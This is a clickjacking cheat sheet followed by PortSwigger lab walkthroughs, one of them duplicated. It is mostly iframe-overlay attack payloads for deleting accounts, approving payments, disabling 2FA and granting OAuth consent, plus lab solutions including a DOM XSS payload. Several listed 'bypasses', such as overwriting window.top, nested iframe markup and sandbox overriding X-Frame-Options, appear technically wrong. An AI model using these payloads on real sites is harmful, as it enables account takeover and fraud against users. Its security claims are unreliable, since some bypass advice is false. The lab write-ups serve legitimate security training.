# ✅ **Clickjacking – Complete Test Case (with Bypass Cases)**
---
# **1. List of Vulnerabilities (Clickjacking Attack Surface)**

* **1.1 Missing `X-Frame-Options` Header**
  Page can be embedded inside an attacker-controlled iframe.

* **1.2 `X-Frame-Options: ALLOWALL` or Invalid Value**
  Browser ignores invalid settings → vulnerable.

* **1.3 Misconfigured `Content-Security-Policy: frame-ancestors`**
  Too broad or missing → allows clickjacking.

* **1.4 UI Redressing Attacks**
  Attacker overlays UI to trick user into clicking.

* **1.5 Same-Origin Framing Attack**
  Trusted pages frame each other, bypassing some protections.

* **1.6 Multi-Step Clickjacking (Banking/Payment)**
  Step-by-step forced clicks.

* **1.7 Drag-and-Drop Clickjacking**
  Overlay uses draggable elements to trigger actions.

* **1.8 CursorJacking**
  Using CSS to hide/misplace actual cursor.

* **1.9 Cross-Domain iFrame Overlay for CSRF**
  Clickjacking combined with CSRF → dangerous.

* **1.10 Transparent Pixel Attack**
  Critical button hidden behind attacker UI.

---

# **2. Sample Payloads (Core Attack Payloads)**

(Basic PoC HTML pages — safe for learning)

### **2.1 Basic Clickjacking PoC**

```html
<html>
<body>
<h1>Click the button below to win a prize!</h1>

<iframe 
  src="https://victim.com/critical-action" 
  style="opacity:0.01; position:absolute; top:0; left:0; width:100%; height:100%;">
</iframe>

</body>
</html>
```

### **2.2 Invisible Button Overlay**

```html
<div style="opacity:0.01; position:absolute; z-index:9999;">
  <iframe src="https://victim.com/account/delete"></iframe>
</div>
```

### **2.3 Forced Login/Confirm Button Click**

```html
<button onclick="document.getElementsByTagName('iframe')[0].click()">Claim reward</button>

<iframe src="https://victim.com/confirm-payment" style="opacity:0"></iframe>
```

### **2.4 Simple Frame Test**

```html
<iframe src="https://victim.com"></iframe>
```

If it loads → vulnerable.

---

# **3. Bypass Payloads (Advanced Techniques)**

### **3.1 Bypass Weak `X-Frame-Options`**

If server uses:

```
X-Frame-Options: ALLOWALL
```

Browser ignores → frame loads normally.

### **3.2 CSP Frame-Ancestors Misuse**

If server has:

```
Content-Security-Policy: frame-ancestors *
```

Attacker can embed site from any domain.

### **3.3 Using `sandbox` Attribute to Bypass**

```html
<iframe sandbox="allow-scripts allow-forms" src="https://victim.com"></iframe>
```

Some browsers allow framing even when XFO blocks.

### **3.4 Using Middle Page Redirect**

Attacker hosts:

```
attacker.com/frame → redirects to victim.com
```

i.e.,

```html
<iframe src="https://attacker.com/frame"></iframe>
```

Used when `frame-ancestors` checks only final page.

### **3.5 iFrame Busting Bypass**

Overwrite JS busting scripts:

```html
<script>window.top = window;</script>
<iframe src="https://victim.com"></iframe>
```

### **3.6 Double iFrame Trick (nested frames)**

Some policies fail when:

```html
<iframe src="intermediate.html">
   <iframe src="https://victim.com"></iframe>
</iframe>
```

### **3.7 Using CSS to Confuse UI (UI Redressing)**

```css
iframe {pointer-events: none;}
button {pointer-events: auto; opacity:0;}
```

### **3.8 CursorJacking**

```css
body { cursor: none; }
.fake-cursor { position:absolute; pointer-events:none; }
```

---

# **4. Updated With Realistic Testing Payloads (Advanced Learning)**

### **4.1 Delete Account Clickjacking PoC**

```html
<iframe 
  src="https://victim.com/user/delete"
  style="opacity:0; width:100%; height:100%; position:absolute;">
</iframe>
```

### **4.2 Financial Transaction Clickjack**

```html
<button style="opacity:0">Pay</button>
<iframe src="https://victim.com/payment/approve" style="opacity:0"></iframe>
```

### **4.3 CSRF + Clickjacking Combo**

```html
<iframe src="https://victim.com/transfer?amount=5000&to=attacker"></iframe>
```

### **4.4 Admin Panel Clickjacking**

```html
<iframe src="https://victim.com/admin/enable-user?user=attacker"></iframe>
```

### **4.5 Multi-Click Flow Attack**

```html
<iframe src="https://victim.com/settings/2fa/disable" style="opacity:0"></iframe>
```

### **4.6 OAuth Approval Clickjack**

```html
<iframe src="https://victim.com/oauth/approve" style="opacity:0"></iframe>
```

---

# **5. Validation / Test Steps**

**Step 1:** Check headers

* `X-Frame-Options`
* `Content-Security-Policy: frame-ancestors`

**Step 2:** Place page in iframe

```html
<iframe src="https://target.com"></iframe>
```

**Step 3:** If loads → vulnerable.

**Step 4:** Try advanced bypass (redirects, sandbox iframe).

**Step 5:** Build PoC HTML page to trigger a real action (safe testing only).

---

# **6. Expected Results / Impact**

* Forced actions triggered without user consent.
* Account deletion, altering settings, disabling MFA.
* Unauthorized money transfers.
* Forced OAuth authorization.
* Combined with CSRF → **critical account takeover**.
* UI Redressing → invisible interface abuse.

---

# 01 Basic clickjacking with CSRF token protection

This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter

Note: The victim will be using Chrome so test your exploit on that browser.

---------------------------------------------

References: 

- https://portswigger.net/web-security/clickjacking



![img](images/Basic%20clickjacking%20with%20CSRF%20token%20protection/1.png)

---------------------------------------------

The problem is to set the correct CSS valus so the button is clicked, in this case these values worked:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:600px;
			height:600px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:600px;
			height:600px;
			z-index:1;
			}
		#btn {
			position:absolute;
			top:480px;
			left:90px;
		}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button id="btn">click</button>
	</div>
	<iframe id="target_website" src="https://0a19006b043fc0ca803c0dd100220095.web-security-academy.net/my-account">
	</iframe>
</body>
```



![img](images/Basic%20clickjacking%20with%20CSRF%20token%20protection/2.png)

# 02 Clickjacking with form input data prefilled from a URL parameter

This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter

Note: The victim will be using Chrome so test your exploit on that browser.

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.


---------------------------------------------

References: 

- https://portswigger.net/web-security/clickjacking



![img](images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/1.png)

---------------------------------------------

If the user profile is accessed with the parameter “email”, the email field gets populated:



![img](images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/2.png)


So we can execute the attack with a payload like this:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:600px;
			height:600px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:600px;
			height:600px;
			z-index:1;
			}
		#btn {
			position:absolute;
			top:440px;
			left:70px;
		}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button id="btn">Click me</button>
	</div>
	<iframe id="target_website" src="https://0a11003f031a6dc080b6033a0090001e.web-security-academy.net/my-account?email=test@test.com">
	</iframe>
</body>
```



![img](images/Clickjacking%20with%20form%20input%20data%20prefilled%20from%20a%20URL%20parameter/3.png)

# 03 Clickjacking with a frame buster script

This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter

Note: The victim will be using Chrome so test your exploit on that browser.

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/clickjacking



![img](images/Clickjacking%20with%20a%20frame%20buster%20script/1.png)

---------------------------------------------

If the user profile is accessed with the parameter “email”, the email field gets populated:



![img](images/Clickjacking%20with%20a%20frame%20buster%20script/2.png)


If we try to use the payload from previous labs we get this error:



![img](images/Clickjacking%20with%20a%20frame%20buster%20script/3.png)

We can add 'sandbox="allow-forms"' to the iframe code to avoid this problem, so we can execute the attack with a payload like this:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:600px;
			height:600px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:600px;
			height:600px;
			z-index:1;
			}
		#btn {
			position:absolute;
			top:440px;
			left:70px;
		}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button id="btn">Click me</button>
	</div>
	<iframe id="target_website" src="https://0a11003f031a6dc080b6033a0090001e.web-security-academy.net/my-account?email=test@test.com" sandbox="allow-forms">
	</iframe>
</body>
```



![img](images/Clickjacking%20with%20a%20frame%20buster%20script/4.png)

# 04 Exploiting clickjacking vulnerability to trigger DOM-based XSS

This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function.

Note: The victim will be using Chrome so test your exploit on that browser.


---------------------------------------------

References: 

- https://portswigger.net/web-security/clickjacking



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/1.png)

---------------------------------------------

There is a function to submit feedback:



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/2.png)


It reflects the content of the name field:



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/3.png)


It is inside a span tag:



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/4.png)


We can exploit the XSS using the payload:

```
</span><img src=x onerror=alert(1)><span>
```



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/5.png)


The fields can be populated using GET parameters:

```
/feedback?name=</span><img src=x onerror=alert(1)><span>&email=a@a.com&subject=a&message=a
```



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/6.png)


So we can execute the attack with a payload like this:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:600px;
			height:600px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:600px;
			height:600px;
			z-index:1;
			}
		#btn {
			position:absolute;
			top:440px;
			left:70px;
		}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button id="btn">Click me</button>
	</div>
	<iframe id="target_website" src="https://0a9500e703977b7c812c80ce00300073.web-security-academy.net/feedback?name=%3C/span%3E%3Cimg%20src=x%20onerror=print()%3E%3Cspan%3E&email=a@a.com&subject=a&message=a">
	</iframe>
</body>
```



![img](images/Exploiting%20clickjacking%20vulnerability%20to%20trigger%20DOM-based%20XSS/7.png)

# 05 - Multistep clickjacking

This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

You can log in to the account yourself using the following credentials: wiener:peter

Note: The victim will be using Chrome so test your exploit on that browser.

---------------------------------------------

References:

- https://portswigger.net/web-security/csrf

- https://portswigger.net/web-security/clickjacking 

---------------------------------------------

Generated link: https://0a910056047f851e816330fc004400af.web-security-academy.net/



![img](images/Multistep%20clickjacking/1.png)


I took the example from https://portswigger.net/web-security/clickjacking:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

And adapted it to this example:

```
<head>
    <style>
        #target_website {
            position:relative;
            width:100%;
            height:100%;
            opacity:0.0001;
            z-index:2;
            }
        #button1 {
            position:absolute;
            top:530px;
            left:400px;
        }
       #button2 {
            position:absolute;
            top:330px;
            left:570px;
        }
    </style>
</head>
<body>
    <button class="button" id="button1" type="submit">Click me first</button>
    <button class="button" id="button2" type="submit">Click me next</button>
    <iframe id="target_website" src="https://0a910056047f851e816330fc004400af.web-security-academy.net/my-account/">
    </iframe>
</body>
```

If you host it in the exploit server after clicking “Click me first” button it takes to the confirmation page:



![img](images/Multistep%20clickjacking/2.png)

Here, clicking the “Click me next” button the user would be deleted:



![img](images/Multistep%20clickjacking/3.png)

But if you send this, the user does not get deleted, probably because we used width:100% and height:100%, so the payload depends on the screen resolution. I will use a small ifram size with fixed size of 500x600 px:

```
<head>
    <style>
        #target_website {
            position:relative;
            //width:100%;
            //height:100%;
            width:500px;
            height:600px;
            opacity:0.1;
            z-index:2;
            }
        #button1 {
            position:absolute;
            top:495px;
            left:55px;
        }
       #button2 {
            position:absolute;
            top:290px;
            left:200px;
        }
    </style>
</head>
<body>
    <button class="button" id="button1" type="submit">Click me first</button>
    <button class="button" id="button2" type="submit">Click me next</button>
    <iframe id="target_website" src="https://0a910056047f851e816330fc004400af.web-security-academy.net/my-account/">
    </iframe>
</body>
```

Adjust the first button:



![img](images/Multistep%20clickjacking/4.png)

And the second one:



![img](images/Multistep%20clickjacking/5.png)

This time we get the lab solved message!


# 8 - Multistep clickjacking

This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

You can log in to the account yourself using the following credentials: wiener:peter

Note: The victim will be using Chrome so test your exploit on that browser.

---------------------------------------------

References:

- https://portswigger.net/web-security/csrf

- https://portswigger.net/web-security/clickjacking 

---------------------------------------------

Generated link: https://0a910056047f851e816330fc004400af.web-security-academy.net/



![img](images/8%20-%20Multistep%20clickjacking/1.png)


I took the example from https://portswigger.net/web-security/clickjacking:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

And adapted it to this example:

```
<head>
    <style>
        #target_website {
            position:relative;
            width:100%;
            height:100%;
            opacity:0.0001;
            z-index:2;
            }
        #button1 {
            position:absolute;
            top:530px;
            left:400px;
        }
       #button2 {
            position:absolute;
            top:330px;
            left:570px;
        }
    </style>
</head>
<body>
    <button class="button" id="button1" type="submit">Click me first</button>
    <button class="button" id="button2" type="submit">Click me next</button>
    <iframe id="target_website" src="https://0a910056047f851e816330fc004400af.web-security-academy.net/my-account/">
    </iframe>
</body>
```

If you host it in the exploit server after clicking “Click me first” button it takes to the confirmation page:



![img](images/8%20-%20Multistep%20clickjacking/2.png)

Here, clicking the “Click me next” button the user would be deleted:



![img](images/8%20-%20Multistep%20clickjacking/3.png)

But if you send this, the user does not get deleted, probably because we used width:100% and height:100%, so the payload depends on the screen resolution. I will use a small iframe size with fixed size of 500x600 px:

```
<head>
    <style>
        #target_website {
            position:relative;
            //width:100%;
            //height:100%;
            width:500px;
            height:600px;
            opacity:0.1;
            z-index:2;
            }
        #button1 {
            position:absolute;
            top:495px;
            left:55px;
        }
       #button2 {
            position:absolute;
            top:290px;
            left:200px;
        }
    </style>
</head>
<body>
    <button class="button" id="button1" type="submit">Click me first</button>
    <button class="button" id="button2" type="submit">Click me next</button>
    <iframe id="target_website" src="https://0a910056047f851e816330fc004400af.web-security-academy.net/my-account/">
    </iframe>
</body>
```

First button looks good:



![img](images/8%20-%20Multistep%20clickjacking/4.png)

And the second one as well:



![img](images/8%20-%20Multistep%20clickjacking/5.png)

Change the opacity to 0.00001, send it and this time we get the lab solved message.
